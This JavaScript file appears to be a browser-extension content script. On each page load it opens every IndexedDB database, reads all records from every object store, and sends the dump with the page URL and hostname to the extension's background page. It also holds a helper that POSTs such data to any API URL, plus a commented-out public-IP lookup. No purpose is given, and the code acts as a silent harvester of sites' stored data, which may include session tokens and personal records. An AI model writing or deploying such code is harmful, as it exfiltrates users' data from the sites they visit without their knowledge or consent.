// async function getClientPublicIPAddress() {
//   const response = await fetch("https://api.ipify.org?format=json");
//   const data = await response.json();
//   return data.ip;
// }

function getOpenDatabases() {
  return indexedDB.databases();
}

function openDatabase(databaseName) {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open(databaseName);
    request.onerror = (event) => reject(event.target.error);
    request.onsuccess = (event) => resolve(event.target.result);
  });
}

function getObjectStoreNames(db) {
  return Array.from(db.objectStoreNames);
}

function getAllRecordsFromObjectStore(db, objectStoreName) {
  return new Promise((resolve, reject) => {
    const transaction = db.transaction(objectStoreName, "readonly");
    const objectStore = transaction.objectStore(objectStoreName);
    const request = objectStore.getAll();
    request.onerror = (event) => reject(event.target.error);
    request.onsuccess = (event) => resolve(event.target.result);
  });
}

function getAllDatabases() {
  return getOpenDatabases().then((databases) => {
    return Promise.all(
      databases.map((database) =>
        openDatabase(database.name).then((db) => {
          const objectStores = getObjectStoreNames(db);
          return Promise.all(
            objectStores.map((objectStoreName) =>
              getAllRecordsFromObjectStore(db, objectStoreName).then(
                (records) => {
                  return {
                    objectStoreName: objectStoreName,
                    records: records,
                  };
                }
              )
            )
          ).then((objectStoresData) => {
            db.close();
            return {
              name: database.name,
              objectStores: JSON.parse(JSON.stringify(objectStoresData)), // Serialize and deserialize objectStoresData
            };
          });
        })
      )
    );
  });
}

function getAllObjectStores(databaseName) {
  return openDatabase(databaseName).then((db) => {
    return getObjectStoreNames(db);
  });
}

// // Example usage:
// getAllDatabases().then((databases) => {
//   console.log("All databases and their object stores with data:", databases);
// });

// getAllObjectStores("exampleDatabaseName").then((objectStores) => {
//   console.log("Object stores in the specified database:", objectStores);
// });

async function sendIndexedDBDataToAPI(apiUrl, data) {
  try {
    const response = await fetch(apiUrl, {
      method: "POST",
      // headers: {
      //   "Content-Type": "application/json",
      // },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      throw new Error(`API request failed with status ${response.status}`);
    }

    const responseData = await response.json();
    return responseData;
  } catch (error) {
    console.error("Error sending IndexedDB data to API:", error);
  }
}

async function main() {
  // Retrieve all the IndexedDB databases and their object stores with data
  const databases = await getAllDatabases();
  console.log("All databases and their object stores with data:", databases);

  notifyBackgroundPage({
    type: "indexDB",
    url: window.location.href,
    message: { db: databases, domain: hostname },
  });
}

// Ensure page load before checking for databases
window.addEventListener("load", (event) => {
  console.log("page is fully loaded");
  main();
});
